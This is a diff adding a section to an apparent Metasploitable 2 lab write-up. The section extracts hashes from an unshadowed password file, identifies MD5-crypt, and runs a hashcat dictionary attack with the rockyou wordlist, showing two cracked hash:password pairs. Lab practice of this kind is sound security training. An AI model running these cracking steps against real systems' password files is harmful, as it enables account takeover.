@@ -103,3 +103,19 @@ user             (user)
 postgres         (postgres)
 msfadmin         (msfadmin)
 ```
+
+### Cracking passwords with Hashcat
+Hashcat only needs the hashes and not the complete 'unshadowed' file:
+`awk -F: '{print $2}' combined.txt > hashes`
+
+Metasploitable 2 uses MD5-based crypt, which is Mode 500 in Hashcat.You can tell it's MD5-crypt because the hash starts with `$1$`.
+
+run the attack:
+```bash
+hashcat -m 500 -a 0 hashes /usr/share/wordlists/rockyou.txt
+```
+part of the scan:
+```bash
+$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:123456789
+$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:batman
+```
